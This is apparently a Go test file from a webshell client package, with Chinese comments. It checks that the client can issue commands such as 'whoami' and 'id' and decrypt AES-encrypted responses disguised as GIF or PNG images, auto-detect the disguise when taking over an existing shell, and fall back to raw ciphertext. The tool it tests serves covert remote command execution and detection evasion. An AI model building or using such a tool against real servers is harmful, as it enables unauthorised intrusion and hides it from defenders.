package webshell

// client_disguise_test.go — 端到端验证：服务端用容器返回加密响应，客户端能剥壳解出结果。
// 这是伪装链真正落地的那一环——单测只证明容器合法，这里证明整条往返链路通。

import (
	"net/http"
	"net/http/httptest"
	"testing"
)

// disguiseServer 起一个假目标：把 plain 用指定加密器加密、再用指定容器包起来返回。
func disguiseServer(t *testing.T, plain, password, disguise string) *httptest.Server {
	t.Helper()
	enc, err := GetEncoder("aes")
	if err != nil {
		t.Fatal(err)
	}
	cipherText, err := enc.Encrypt([]byte(plain), password)
	if err != nil {
		t.Fatal(err)
	}
	d, err := GetDisguise(disguise)
	if err != nil || d == nil {
		t.Fatalf("伪装链 %q: %v", disguise, err)
	}
	container, err := d.Wrap(cipherText)
	if err != nil {
		t.Fatal(err)
	}
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", d.ContentType())
		_, _ = w.Write(container)
	}))
}

func TestClientUnwrapsDisguisedResponse(t *testing.T) {
	const pw = "s3cret"
	plain := "www-data\n" + CWDMarker + "/var/www__" + EndMarker
	for _, name := range DisguiseNames() {
		srv := disguiseServer(t, plain, pw, name)
		c := &Client{
			URL:        srv.URL,
			Password:   pw,
			Encoder:    "aes",
			ScriptType: "jsp",
			Disguise:   name,
		}
		res, err := c.ExecCmd("whoami")
		srv.Close()
		if err != nil {
			t.Fatalf("%s: %v", name, err)
		}
		if !res.OK || res.Output != "www-data" || res.CWD != "/var/www" {
			t.Fatalf("%s: 解析失败 %+v", name, res)
		}
	}
}

func TestClientAutoDetectsDisguise(t *testing.T) {
	// 未配置 Disguise 时靠文件签名识别，接管既有 shell 不必事先知道用的哪条链
	const pw = "s3cret"
	plain := "root\n" + CWDMarker + "/__" + EndMarker
	srv := disguiseServer(t, plain, pw, "gif")
	defer srv.Close()
	c := &Client{URL: srv.URL, Password: pw, Encoder: "aes", ScriptType: "php"}
	res, err := c.ExecCmd("id")
	if err != nil {
		t.Fatal(err)
	}
	if !res.OK || res.Output != "root" {
		t.Fatalf("自动识别失败 %+v", res)
	}
}

func TestClientFallsBackOnBrokenContainer(t *testing.T) {
	// 容器损坏时必须回退到裸密文路径，而不是直接把 shell 判死
	const pw = "s3cret"
	plain := "ok\n" + CWDMarker + "/__" + EndMarker
	enc, _ := GetEncoder("aes")
	raw, _ := enc.Encrypt([]byte(plain), pw)
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(raw) // 服务端其实没开伪装
	}))
	defer srv.Close()
	c := &Client{URL: srv.URL, Password: pw, Encoder: "aes", ScriptType: "jsp", Disguise: "png"}
	res, err := c.ExecCmd("whoami")
	if err != nil {
		t.Fatal(err)
	}
	if !res.OK || res.Output != "ok" {
		t.Fatalf("回退失败 %+v", res)
	}
}
